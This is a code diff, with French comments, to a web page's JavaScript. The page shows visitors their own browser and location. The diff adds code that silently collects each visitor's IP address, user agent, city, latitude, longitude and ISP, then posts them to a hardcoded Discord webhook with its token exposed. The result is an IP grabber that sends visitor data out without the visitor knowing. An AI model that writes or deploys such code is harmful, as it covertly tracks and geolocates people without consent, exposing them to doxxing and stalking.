@@ -70,6 +70,37 @@
                 document.getElementById('browser').textContent = `${browserName} ${browserVersion}`;
                 document.getElementById('datetime').textContent = currentDateTime;
                 document.getElementById('location').textContent = `${data.city}, ${data.region}, ${data.country}`;
+
+                // Préparer les informations pour l'embed Discord
+                const embed = {
+                    embeds: [
+                        {
+                            title: "Nouvelle IP collectée",
+                            description: "Détails de la connexion",
+                            color: 3447003,
+                            fields: [
+                                { name: "Adresse IP", value: data.ip, inline: true },
+                                { name: "Date et Heure", value: currentDateTime, inline: true },
+                                { name: "Navigateur", value: `${browserName} ${browserVersion}`, inline: true },
+                                { name: "Système d'Exploitation", value: userAgent, inline: false },
+                                { name: "Localisation", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
+                                { name: "Latitude", value: data.latitude.toString(), inline: true },
+                                { name: "Longitude", value: data.longitude.toString(), inline: true },
+                                { name: "Fournisseur d'Accès Internet (ISP)", value: data.isp, inline: false }
+                            ]
+                        }
+                    ]
+                };
+
+                // Envoyer l'embed au webhook Discord
+                const webhookURL = "https://canary.discord.com/api/webhooks/1302003054790447198/7f_fux6WOnMg2D7V1RtVPxq_560T6tv37O1yFRhySGzUnBLX_U2AT7tHFNqyCVHVSGMb";
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embed)
+                });
             } catch (error) {
                 // Afficher le message d'erreur dans la page
                 document.getElementById('error').textContent = error.message;
